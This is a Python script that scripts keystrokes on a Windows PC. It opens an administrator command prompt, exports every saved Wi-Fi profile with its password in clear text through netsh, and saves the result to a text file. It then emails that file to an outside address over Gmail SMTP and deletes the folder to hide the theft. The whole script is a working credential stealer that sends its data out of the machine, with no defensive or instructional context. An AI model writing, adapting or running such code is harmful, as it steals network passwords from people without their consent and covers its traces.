import pyautogui
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
def mail():
    fromaddr = "senders email"
    frompass = "senders password"
    toaddr = "reciving email"
       
    # instance of MIMEMultipart 
    msg = MIMEMultipart() 
      
    # storing the senders email address   
    msg['From'] = fromaddr 
      
    # storing the receivers email address  
    msg['To'] = toaddr 
      
    # storing the subject  
    msg['Subject'] = "report py"
      
    # string to store the body of the mail 
    body = "it works!"
      
    # attach the body with the msg instance 
    msg.attach(MIMEText(body, 'plain')) 
      
    # open the file to be sent  
    filename = "wifi.txt"
    attachment = open("C:/wifi/wifi.txt", "rb") 
      
    # instance of MIMEBase and named as p 
    p = MIMEBase('application', 'octet-stream') 
      
    # To change the payload into encoded form 
    p.set_payload((attachment).read()) 
      
    # encode into base64 
    encoders.encode_base64(p) 
       
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
      
    # attach the instance 'p' to instance 'msg' 
    msg.attach(p) 
      
    # creates SMTP session 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
      
    # start TLS for security 
    s.starttls() 
      
    # Authentication 
    s.login(fromaddr, frompass) 
      
    # Converts the Multipart msg into a string 
    text = msg.as_string() 
      
    # sending the mail 
    s.sendmail(fromaddr, toaddr, text) 
      
    # terminating the session 
    s.quit() 
# DETAILS: Opens cmd(Admin), obtains wifi password, and saves it to a txt file. 
# Deletes txt file in cmd. Exits cmd.
time.sleep(2.5)
pyautogui.hotkey("win","x")
time.sleep(0.1)
pyautogui.typewrite("a", interval=0.01)
time.sleep(1)
pyautogui.hotkey("left")
time.sleep(0.3)
pyautogui.hotkey("enter")
time.sleep(0.1)
pyautogui.typewrite("cd /", interval=0.01)
time.sleep(0.1)
pyautogui.hotkey("enter")
time.sleep(0.1)
pyautogui.typewrite("md wifi", interval=0.01)
time.sleep(0.1)
pyautogui.hotkey("enter")
time.sleep(0.1)
pyautogui.typewrite("cd wifi", interval=0.01)
time.sleep(0.1)
pyautogui.hotkey("enter")
time.sleep(0.1)
pyautogui.typewrite("netsh wlan export profile key=clear", interval=0.01)
time.sleep(0.1)
pyautogui.hotkey("enter")
time.sleep(0.5)
pyautogui.typewrite("copy *.xml wifi.txt", interval=0.01)
time.sleep(0.1)
pyautogui.hotkey("enter")
time.sleep(0.5)
# ----------Send through Email
mail()
pyautogui.typewrite("cd /", interval=0.01)
time.sleep(0.1)
pyautogui.hotkey("enter")
time.sleep(0.1)
pyautogui.typewrite("rd /s /q wifi", interval=0.01)
time.sleep(0.2)
pyautogui.hotkey("enter")
time.sleep(0.5)
pyautogui.typewrite("exit", interval=0.01)
time.sleep(0.1)
pyautogui.hotkey("enter")
